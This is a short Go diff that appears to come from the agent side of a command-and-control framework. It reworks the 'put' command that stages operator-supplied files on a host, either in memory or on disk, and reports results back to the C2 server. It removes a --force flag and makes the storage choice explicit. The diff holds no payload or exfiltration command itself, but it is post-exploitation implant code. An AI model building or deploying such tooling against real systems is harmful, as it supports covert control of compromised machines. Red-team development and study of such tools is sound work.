@@ -75,7 +75,6 @@ func putCmdRun(cmd *cobra.Command, args []string) {
 	downloadAddr, _ := cmd.Flags().GetString("addr")
 	// saveToMem flag is deprecated in logic, we infer from path or default to auto
 	// saveToMem, _ := cmd.Flags().GetBool("mem")
-	force, _ := cmd.Flags().GetBool("force")
 
 	if fileName == "" || destPath == "" || size == 0 {
 		c2transport.NotifyC2(cmd, "%s", fmt.Sprintf("args error: %v", args))
@@ -90,28 +89,24 @@ func putCmdRun(cmd *cobra.Command, args []string) {
 		return
 	}
 
-	// Try to save with Auto strategy (defaults to memory if small enough)
-	// If path implies memory (mem://), it will enforce memory.
-	err = util.SaveFileAgent(destPath, data, 0o600, util.StorageAuto)
+	// Determine storage strategy based on destination path
+	// If path is mem:// prefix, force memory. Otherwise, force disk (don't use Auto)
+	strategy := util.StorageDisk
+	if strings.HasPrefix(destPath, "mem://") {
+		strategy = util.StorageMemory
+	}
+
+	// Try to save with determined strategy
+	err = util.SaveFileAgent(destPath, data, 0o600, strategy)
 	if err != nil {
-		// Failed (likely Auto tried memory and failed, or disk failed)
-		// We only retry to Disk if --force is present AND the initial attempt wasn't explicitly mem://
-		if strings.HasPrefix(destPath, "mem://") {
+		// If memory storage was requested but failed
+		if strategy == util.StorageMemory {
 			c2transport.NotifyC2(cmd, "%s", fmt.Sprintf("put: failed to save to memory %s: %v", destPath, err))
 			return
 		}
-
-		if !force {
-			c2transport.NotifyC2(cmd, "Error: Memory unavailable and --force not specified. File not saved.\nUse --force to write to disk (encrypted).")
-			return
-		}
-
-		// Force disk
-		err = util.SaveFileAgent(destPath, data, 0o600, util.StorageDisk)
-		if err != nil {
-			c2transport.NotifyC2(cmd, "%s", fmt.Sprintf("put: failed to force save to disk %s: %v", destPath, err))
-			return
-		}
+		// Disk storage failed
+		c2transport.NotifyC2(cmd, "%s", fmt.Sprintf("put: failed to save to disk %s: %v", destPath, err))
+		return
 	}
 
 	// Success
